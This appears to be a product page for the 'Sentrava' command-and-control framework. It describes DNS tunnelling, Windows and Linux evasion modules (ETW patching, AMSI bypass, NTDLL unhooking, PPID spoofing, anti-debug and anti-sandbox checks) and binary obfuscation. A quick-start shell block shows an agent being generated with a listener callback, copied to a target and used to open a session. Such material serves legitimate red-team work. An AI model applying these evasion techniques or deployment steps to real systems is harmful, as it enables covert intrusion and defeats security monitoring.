DNS Transport

Tunnel C2 traffic over DNS TXT record queries — effective where HTTP/TCP is blocked. The agent encodes beacon data into base64-padded TXT lookups; the teamserver resolves queries via its embedded resolver on UDP/53. No external DNS provider required.

Windows OPSEC Suite

Six kernel and userland modules targeting Windows telemetry: ETW patch, AMSI bypass, NTDLL unhooking from a clean on-disk copy, PPID spoofing to inherit a trusted parent, indirect syscalls via runtime trampoline, and SleepMask obfuscation during sleep intervals.

Lifecycle Controls

Kill Date forces the agent to self-terminate after a configured UTC timestamp — no operator action required. Working Hours restricts beacon callbacks to a defined daily window, reducing noise outside business hours. Both are embedded at build time via ldflags.

Lifecycle reference ↗
Supported

Binary Hardening

Garble integration rewrites symbol names, obfuscates string literals, and strips DWARF debug info at compile time. XOR obfuscation via ldflags XORs the agent's embedded server credential. The resulting binary has no visible function names, import table symbols, or plaintext strings.

OPSEC stack / 03

Eleven modules. Two platforms.

Each module is opt-in, embedded at build time, and independently documented with ldflags and verification steps.

Linux 5 modules

  • guardrailsAborts execution if environment checks fail — wrong hostname, missing env var, UID mismatch. Prevents detonation outside the intended target.
  • validatorValidates TLS server certificate fingerprint against an embedded SHA-256 pin. Blocks MITM analysis of agent traffic in a sandbox.
  • sleepmaskXOR-encrypts the agent's heap region before sleeping and decrypts on wake. Reduces in-memory IOCs visible to YARA-based scanners during dwell time.
  • canaryInjects a synthetic debug event. If a debugger is attached, the canary fires and the agent self-terminates before executing the beacon loop.
  • polymorphRe-encrypts embedded configuration literals on each run using a derived key. String-based signatures on the binary's data section do not persist across executions.

Windows 6 modules

  • etw-patchPatches EtwEventWrite in ntdll.dll to return immediately. Prevents ETW-based EDR telemetry from capturing agent activity, including .NET assembly loads and reflective injection.
  • amsi-bypassPatches AmsiScanBuffer to always return AMSI_RESULT_CLEAN. Disables Windows Defender AMSI scanning for in-memory payloads executed by the agent.
  • ntdll-unhookReplaces the in-memory ntdll.dll with a clean copy read directly from disk, removing userland hooks placed by EDR products in the syscall stubs.
  • ppid-spoofSpawns child processes with a spoofed parent PID. Process tree analysis shows a trusted system process as parent instead of the agent, reducing behavioural detections.
  • indirect-syscallRoutes sensitive NT API calls through a runtime trampoline that jumps directly into the syscall instruction, bypassing userland hooks without calling ntdll stubs.
  • sleepmask-winEncrypts the agent's private heap and decommits stack pages during sleep intervals. In-memory scanners operating during dwell time find no agent artefacts.

All modules are enabled via --opsec / --win-opsec flags at generate time. Presets: none · basic · full. OPSEC overview →

Quick start / 05

Up and running
in minutes.

Zero-flag agent deployment. Credentials embedded at build time via ldflags.

Read the full deployment guide →
bash · quick start
# Start teamserver
./bin/sentrava-server

# Launch operator client
./bin/sentrava-client

# Create operation and generate agent
sentrava > operations create op1 --target 192.168.0.197
sentrava > generate --listener 192.168.0.199:4433

# Deploy on target
scp <package>/sentrava-agent user@target:~/
# On target: ./sentrava-agent

# Get a session
sentrava > sessions list
sentrava > sessions use <id>
sentrava > whoami

What makes Sentrava’s approach distinct?

The combination of CLI and browser access, SQLite-backed state and explicit enrollment / operation boundaries is its focus. These are design choices, not claims that other frameworks lack access control or task tracking.
